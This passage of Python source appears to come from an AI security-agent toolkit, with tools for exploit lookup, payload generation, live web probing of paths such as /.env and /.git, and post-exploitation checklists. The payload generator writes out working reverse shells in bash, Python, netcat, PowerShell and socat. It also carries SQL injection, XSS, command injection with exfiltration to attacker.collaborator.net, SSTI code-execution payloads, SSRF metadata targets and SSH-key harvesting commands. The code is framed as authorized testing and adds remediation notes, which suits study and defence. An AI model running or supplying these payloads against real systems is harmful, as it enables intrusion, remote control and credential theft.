            for op in open_ports:
                banner_str = f"`{op['banner']}`" if op['banner'] else "N/A"
                lines.append(f"| {op['port']}/TCP | OPEN | {op['service']} | {banner_str} |")

            lines.append("\n#### Attack Surface & Defense Observations:")
            for op in open_ports:
                p = op["port"]
                if p in (21, 23):
                    lines.append(f"- **Port {p} ({op['service']}):** Unencrypted protocol! Vulnerable to credential interception. Recommend TLS/SSH.")
                elif p in (445, 139):
                    lines.append(f"- **Port {p} (SMB):** SMB exposed. Audit for SMBv1 (EternalBlue), anonymous share access, and signing requirements.")
                elif p in (1433, 3306, 5432, 6379, 27017):
                    lines.append(f"- **Port {p} ({op['service']}):** Database port externally exposed. Verify bind address is localhost and strong authentication is enforced.")
                elif p in (3389, 5900):
                    lines.append(f"- **Port {p} ({op['service']}):** Remote Desktop service exposed. Verify MFA, NLA, and account lockout policies.")

        return "\n".join(lines)

    def _tool_exploit_db(self, query: str) -> str:
        """
        Look up known exploits and public security advisories by CVE or service name.
        """
        query = query.strip()
        if not query:
            return "Error: Provide a CVE identifier or service keyword. Usage: exploit_db <CVE|service>"

        q_upper = query.upper()
        if q_upper in EXPLOIT_DATABASE:
            entry = EXPLOIT_DATABASE[q_upper]
            return (
                f"### Exploit Advisory: {q_upper}\n\n"
                f"- **Title:** {entry['title']}\n"
                f"- **Service:** {entry['service']}\n"
                f"- **Affected Versions:** {entry['affected_versions']}\n"
                f"- **CVSS:** {entry['cvss']} (Critical / High)\n"
                f"- **CWE:** {entry['cwe']}\n"
                f"- **Exploitation Vector:** {entry['vector']}\n"
                f"- **Remediation & Patch:** {entry['remediation']}"
            )

        matches = []
        q_lower = query.lower()
        for cve_id, entry in EXPLOIT_DATABASE.items():
            searchable = f"{cve_id} {entry['title']} {entry['service']} {entry['affected_versions']} {entry['vector']} {entry['cwe']}".lower()
            if q_lower in searchable:
                matches.append((cve_id, entry))

        if not matches:
            return f"No advisories found for '{query}'. Try searching by CVE (e.g., CVE-2021-44228) or service (apache, spring, ssh, windows, sudo, smb)."

        lines = [f"Found {len(matches)} advisories matching '{query}':\n"]
        for cve_id, entry in matches[:5]:
            lines.append(f"#### [{cve_id}] {entry['title']}")
            lines.append(f"- **Service:** {entry['service']} | **CVSS:** {entry['cvss']} | **CWE:** {entry['cwe']}")
            lines.append(f"- **Affected:** {entry['affected_versions']}")
            lines.append(f"- **Vector:** {entry['vector']}")
            lines.append(f"- **Remediation:** {entry['remediation']}\n")

        if len(matches) > 5:
            lines.append(f"... and {len(matches) - 5} more advisories.")
        return "\n".join(lines)

    def _tool_generate_payload(self, input_str: str) -> str:
        """
        Generate authorized penetration testing payloads, verification vectors,
        and test templates for security audits.
        """
        parts = input_str.strip().split(None, 1)
        if not parts:
            return (
                "Error: Specify payload category. Usage: generate_payload <type> [sub_type/params]\n"
                "Supported types: sqli, xss, cmdi, revshell, ssti, ssrf, lfi"
            )

        ptype = parts[0].lower()
        param = parts[1].strip() if len(parts) > 1 else ""

        if ptype == "sqli":
            payloads = [
                ("Authentication Bypass (Standard)", "' OR '1'='1' --", "Breaks SQL predicate logic where credentials are authenticated via raw string concatenation."),
                ("Authentication Bypass (Quoted)", "admin'--", "Comments out password condition when username is vulnerable."),
                ("UNION Extraction", "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--", "Extracts metadata across schemas in MySQL/PostgreSQL."),
                ("Time-Based Blind (MySQL)", "' OR IF(1=1, SLEEP(5), 0)--", "Induces conditional 5-second delay to extract data bit-by-bit without verbose error responses."),
                ("Error-Based (MSSQL)", "' AND 1=CONVERT(int, (SELECT @@version))--", "Forces explicit conversion error that outputs database version in the error message."),
            ]
            lines = ["### SQL Injection Test Vectors & Probes:\n"]
            for title, payload, desc in payloads:
                lines.append(f"#### {title}\n```sql\n{payload}\n```\n*Mechanism:* {desc}\n")
            lines.append("**Remediation:** Use parameterized queries (Prepared Statements / ORM parameter binding). Never interpolate untrusted strings into queries.")
            return "\n".join(lines)

        elif ptype == "xss":
            payloads = [
                ("Reflected XSS (Script Probe)", "<script>alert(document.domain)</script>", "Standard script execution probe verifying absence of output HTML encoding."),
                ("Event Handler (Filter Bypass)", "<img src=x onerror=alert(1)>", "Triggers execution upon image load failure; bypasses filters only blocking <script> tags."),
                ("SVG Inline Event", "<svg onload=alert(document.cookie)>", "Valid vector inside modern HTML5 parsing context."),
                ("DOM-Based / Context Escape", "\"><script>alert(1)</script>", "Breaks out of existing HTML attribute value (e.g., <input value=\"...\">)."),
                ("JavaScript Context Escape", "';alert(1);//", "Breaks out of inline JavaScript variable assignment."),
            ]
            lines = ["### Cross-Site Scripting (XSS) Verification Payloads:\n"]
            for title, payload, desc in payloads:
                lines.append(f"#### {title}\n```html\n{payload}\n```\n*Mechanism:* {desc}\n")
            lines.append("**Remediation:** Implement context-aware output encoding (HTML, attribute, JS), Content-Security-Policy (CSP), and use DOMPurify for HTML sanitization.")
            return "\n".join(lines)

        elif ptype in ("revshell", "reverse_shell"):
            ip, port = "10.10.14.5", "4444"
            target_sh = "bash"
            if param:
                p_parts = param.replace(":", " ").split()
                if len(p_parts) >= 2:
                    ip, port = p_parts[0], p_parts[1]
                if len(p_parts) >= 3:
                    target_sh = p_parts[2].lower()

            templates = {
                "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "bash_read": f"/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'",
                "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "nc": f"nc -e /bin/sh {ip} {port}  # Netcat traditional\n# If -e not supported:\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f",
                "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                "socat": f"socat tcp-connect:{ip}:{port} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
            }
            lines = [f"### Reverse Shell Syntax Templates (Target: `{ip}:{port}`)\n"]
            for name, code in templates.items():
                lines.append(f"#### {name.capitalize()}\n```bash\n{code}\n```\n")
            lines.append("**Defensive Hardening:** Egress firewall filtering, restricting interactive shell spawns, monitoring child processes spawned by web server daemons (e.g. www-data -> /bin/sh).")
            return "\n".join(lines)

        elif ptype == "cmdi":
            lines = [
                "### OS Command Injection Verification Probes:\n",
                "#### Semicolon / Shell Chaining\n```bash\n; whoami\n& whoami\n| whoami\n|| whoami\n&& whoami\n```",
                "#### Subshell / Command Substitution\n```bash\n`whoami`\n$(whoami)\n```",
                "#### Out-of-Band (OOB) DNS Exfiltration Probe\n```bash\n; curl http://attacker.collaborator.net/$(whoami)\n; ping -c 1 attacker.collaborator.net\n```",
                "**Remediation:** Avoid shell invocation (`shell=False` in subprocess). Pass arguments as structured lists. Validate against strict allowlists.",
            ]
            return "\n".join(lines)

        elif ptype == "ssti":
            lines = [
                "### Server-Side Template Injection (SSTI) Probes:\n",
                "#### Polyglot Detection\n```text\n${{7*7}} [[7*7]] {{7*7}} <%= 7*7 %>\n```",
                "#### Jinja2 / Python RCE Probe\n```jinja2\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n```",
                "#### Twig / PHP RCE Probe\n```twig\n{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}\n```",
                "**Remediation:** Do not render user-provided strings as template templates; pass user data as context variables instead.",
            ]
            return "\n".join(lines)

        elif ptype == "ssrf":
            lines = [
                "### Server-Side Request Forgery (SSRF) Probes:\n",
                "#### Cloud Metadata Endpoints\n```text\nAWS/OpenStack: http://169.254.169.254/latest/meta-data/\nGCP:           http://metadata.google.internal/computeMetadata/v1/ (Requires Metadata-Flavor: Google header)\nAzure:         http://169.254.169.254/metadata/instance?api-version=2021-02-01\n```",
                "#### Localhost & Internal Loopback Bypasses\n```text\nhttp://127.0.0.1:80\nhttp://0.0.0.0:80\nhttp://[::1]:80\nhttp://2130706433 (Decimal encoding for 127.0.0.1)\nhttp://127.1\n```",
                "**Remediation:** Validate outgoing URLs against strict allowlists of allowed domains/schemes. Block resolution to RFC 1918 private IP addresses.",
            ]
            return "\n".join(lines)

        elif ptype == "lfi":
            lines = [
                "### Local File Inclusion (LFI) & Path Traversal Probes:\n",
                "#### Standard Traversal\n```text\n../../../../etc/passwd\n..\\..\\..\\..\\windows\\win.ini\n```",
                "#### URL Encoded Traversal\n```text\n..%2f..%2f..%2fetc%2fpasswd\n..%252f..%252f..%252fetc%252fpasswd (Double encoded)\n```",
                "#### PHP Wrappers\n```text\nphp://filter/convert.base64-encode/resource=index.php\nphp://input\n```",
                "**Remediation:** Canonicalize paths with `os.path.realpath()` and verify base directory prefix. Avoid passing file paths directly from user input.",
            ]
            return "\n".join(lines)

        return f"Unknown payload category '{ptype}'. Supported: sqli, xss, cmdi, revshell, ssti, ssrf, lfi."

    def _tool_web_attack(self, input_str: str) -> str:
        """
        Web attack surface assessment tool:
        Performs endpoint discovery, directory probing, and HTTP security header audits.
        """
        parts = input_str.strip().split()
        if not parts:
            return "Error: Provide target URL. Usage: web_attack <url> [endpoints|headers|all]"

        url = parts[0]
        mode = parts[1].lower() if len(parts) > 1 else "all"

        if not url.startswith("http://") and not url.startswith("https://"):
            url = f"http://{url}"

        headers_audit = []
        endpoints_audit = []

        if mode in ("headers", "all"):
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "SmartAGENT-SecurityAuditor/1.0"},
                )
                with urllib.request.urlopen(req, timeout=4) as resp:
                    resp_headers = {k.lower(): v for k, v in resp.headers.items()}
                    status = resp.status
            except urllib.error.HTTPError as e:
                resp_headers = {k.lower(): v for k, v in e.headers.items()}
                status = e.code
            except Exception as e:
                resp_headers = {}
                status = None
                headers_audit.append(f"Connection failed to `{url}`: {e}")

            if status is not None:
                headers_audit.append(f"- **Target URL:** `{url}` (HTTP {status})")
                security_headers = [
                    ("Content-Security-Policy", "Mitigates XSS and content injection attacks."),
                    ("Strict-Transport-Security", "Enforces HTTPS connections (HSTS)."),
                    ("X-Frame-Options", "Mitigates Clickjacking attacks."),
                    ("X-Content-Type-Options", "Prevents MIME-type confusion attacks."),
                    ("Referrer-Policy", "Controls referrer leakage to third-parties."),
                    ("Permissions-Policy", "Restricts browser API access (camera, microphone, geolocation)."),
                ]
                missing = []
                present = []
                for hname, desc in security_headers:
                    if hname.lower() in resp_headers:
                        present.append(f"  [✓] `{hname}`: {resp_headers[hname.lower()][:60]}")
                    else:
                        missing.append(f"  [✗] `{hname}`: MISSING - {desc}")

                headers_audit.append(f"**Security Headers Status ({len(present)} Present / {len(missing)} Missing):**")
                if present:
                    headers_audit.extend(present)
                if missing:
                    headers_audit.extend(missing)

                leakage = []
                for leak_h in ("server", "x-powered-by", "x-aspnet-version", "x-runtime"):
                    if leak_h in resp_headers:
                        leakage.append(f"  [!] `{leak_h}`: `{resp_headers[leak_h]}` (Technology Disclosure)")
                if leakage:
                    headers_audit.append("\n**Information Disclosure Headers:**")
                    headers_audit.extend(leakage)

        if mode in ("endpoints", "all"):
            common_probes = [
                ("/.env", "Environment configuration file containing credentials"),
                ("/.git/HEAD", "Exposed Git repository metadata"),
                ("/admin", "Administrative management interface"),
                ("/api/v1", "API endpoint root"),
                ("/swagger.json", "Swagger API documentation definitions"),
                ("/robots.txt", "Robots crawler exclusion rules"),
                ("/health", "Service health check endpoint"),
                ("/actuator/health", "Spring Boot Actuator health endpoint"),
                ("/config.json", "Client configuration file"),
                ("/debug", "Debug console or runtime endpoint"),
            ]
            base_url = url.rstrip("/")
            endpoints_audit.append(f"**Endpoint Discovery & Probing on `{base_url}`:**")
            lines_table = []

            for path, purpose in common_probes:
                probe_url = f"{base_url}{path}"
                try:
                    preq = urllib.request.Request(
                        probe_url,
                        headers={"User-Agent": "SmartAGENT-SecurityAuditor/1.0"},
                    )
                    with urllib.request.urlopen(preq, timeout=2.5) as presp:
                        code = presp.status
                except urllib.error.HTTPError as e:
                    code = e.code
                except Exception:
                    code = "ERR"

                if code == 200:
                    lines_table.append(f"| `{path}` | **200 OK** | 🚨 EXPOSED: {purpose} |")
                elif code in (401, 403):
                    lines_table.append(f"| `{path}` | {code} Protected | 🔒 Access Restricted: {purpose} |")
                elif code in (301, 302):
                    lines_table.append(f"| `{path}` | {code} Redirect | ↪ Redirected |")
                elif code == 404:
                    pass
                elif code != "ERR":
                    lines_table.append(f"| `{path}` | {code} | {purpose} |")

            if lines_table:
                endpoints_audit.append("| Endpoint | Status | Finding Assessment |")
                endpoints_audit.append("|----------|--------|--------------------|")
                endpoints_audit.extend(lines_table)
            else:
                endpoints_audit.append("No sensitive default paths were exposed (all 404 or filtered).")

        output = ["### Web Attack Surface & Security Audit Report"]
        if headers_audit:
            output.append("\n#### 1. HTTP Security Headers Audit\n" + "\n".join(headers_audit))
        if endpoints_audit:
            output.append("\n#### 2. Exposed Resource Discovery\n" + "\n".join(endpoints_audit))

        return "\n".join(output)

    def _tool_post_exploit(self, input_str: str) -> str:
        """
        Post-exploitation and privilege escalation auditor:
        Generates enumeration checklists, persistence detection rules,
        and lateral movement audits for Linux/Windows/Active Directory.
        """
        parts = input_str.strip().split(None, 1)
        os_type = parts[0].lower() if parts else "linux"
        category = parts[1].lower() if len(parts) > 1 else "all"

        if os_type in ("linux", "unix", "posix"):
            sections = []
            if category in ("privesc", "all"):
                sections.append(
                    "#### Linux Privilege Escalation Audit (MITRE T1068, T1548):\n"
                    "- **SUID / SGID Binaries:**\n"
                    "  `find / -perm -4000 -type f 2>/dev/null`\n"
                    "  *Audit:* Look for non-standard SUID files or binaries listed on GTFOBins (e.g., nmap, vim, bash, cp, find).\n"
                    "- **Sudo Permissions:**\n"
                    "  `sudo -l`\n"
                    "  *Audit:* Check for NOPASSWD entries or wildcards in allowed commands.\n"
                    "- **Cron Jobs & Scheduled Tasks:**\n"
                    "  `cat /etc/crontab /etc/cron.*/* /var/spool/cron/crontabs/* 2>/dev/null`\n"
                    "  *Audit:* Writable scripts executed by root, or PATH variable manipulation.\n"
                    "- **Capabilities:**\n"
                    "  `getcap -r / 2>/dev/null`\n"
                    "  *Audit:* Look for `cap_setuid`, `cap_dac_override`, `cap_sys_admin` on Python or Perl binaries.\n"
                    "- **Writable Sensitive Files:**\n"
                    "  `ls -la /etc/passwd /etc/shadow /etc/sudoers`"
                )
            if category in ("persistence", "all"):
                sections.append(
                    "#### Linux Persistence Audit (MITRE T1053, T1098, T1547):\n"
                    "- **SSH Authorized Keys:**\n"
                    "  `cat ~/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null`\n"
                    "- **Systemd User & System Services:**\n"
                    "  `ls -la /etc/systemd/system/ ~/.config/systemd/user/`\n"
                    "- **Shell Profiles & RC Files:**\n"
                    "  `cat ~/.bashrc ~/.bash_profile /etc/profile /etc/bash.bashrc`\n"
                    "- **Cron Backdoors:**\n"
                    "  `crontab -l; ls -la /var/spool/cron/crontabs/`"
                )
            if category in ("lateral_movement", "all"):
                sections.append(
                    "#### Linux Lateral Movement & Discovery (MITRE T1021, T1046):\n"
                    "- **Network Connections & ARP:**\n"
                    "  `ss -tulnp; ip neigh; arp -a`\n"
                    "- **Harvesting SSH Keys & Configs:**\n"
                    "  `find /home /root -name id_rsa -o -name id_ed25519 -o -name known_hosts 2>/dev/null`\n"
                    "- **NFS Shares:**\n"
                    "  `cat /etc/exports; showmount -e <target>`"
                )
            return f"### Linux Post-Exploitation & Hardening Checklist\n\n" + "\n\n".join(sections)

        elif os_type in ("windows", "win"):
            sections = []
            if category in ("privesc", "all"):
                sections.append(
                    "#### Windows Privilege Escalation Audit (MITRE T1068, T1574, T1134):\n"
                    "- **Unquoted Service Paths:**\n"
                    "  `wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"`\n"
                    "- **Token Privileges (Impersonation):**\n"
                    "  `whoami /priv`\n"
                    "  *Audit:* Check for `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`.\n"
                    "- **AlwaysInstallElevated:**\n"
                    "  `reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`\n"
                    "- **Saved Credentials:**\n"
                    "  `cmdkey /list`"
                )
            if category in ("persistence", "all"):
                sections.append(
                    "#### Windows Persistence Audit (MITRE T1547, T1053):\n"
                    "- **Registry Run Keys:**\n"
                    "  `reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n"
                    "  `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n"
                    "- **Scheduled Tasks:**\n"
                    "  `schtasks /query /fo LIST /v`\n"
                    "- **Startup Folders:**\n"
                    "  `dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"`\n"
                    "- **Accessibility Backdoors (Sticky Keys):**\n"
                    "  `reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"`"
                )
            return f"### Windows Post-Exploitation & Hardening Checklist\n\n" + "\n\n".join(sections)

        elif os_type in ("ad", "active_directory", "domain"):
            return (
                "### Active Directory Post-Exploitation & Lateral Movement (MITRE T1558, T1550, T1078):\n\n"
                "- **Kerberoasting Audit (T1558.003):**\n"
                "  Query user accounts with ServicePrincipalNames (SPNs). Request TGS tickets with RC4 encryption and crack offline.\n"
                "  *Detection:* Windows Event ID 4769 (A Kerberos service ticket was requested with Ticket Encryption Type 0x17).\n\n"
                "- **AS-REP Roasting (T1558.004):**\n"
                "  Find accounts with `DONT_REQ_PREAUTH` set in UserAccountControl.\n"
                "  *Remediation:* Enforce Kerberos pre-authentication on all domain accounts.\n\n"
                "- **Pass-the-Hash / Pass-the-Ticket (T1550):**\n"
                "  Lateral movement using NTLM hashes via SMB (Port 445) or Kerberos tickets.\n"
                "  *Detection:* Event ID 4624 (Logon Type 3 with NTLM authentication) between workstations.\n\n"
                "- **BloodHound / Domain Graph Reconnaissance:**\n"
                "  Audit shortest attack paths to Domain Admins, sensitive ACLs (GenericAll, WriteDacl), and unconstrained delegation."
            )

        return f"Unknown OS type '{os_type}'. Supported: linux, windows, ad."
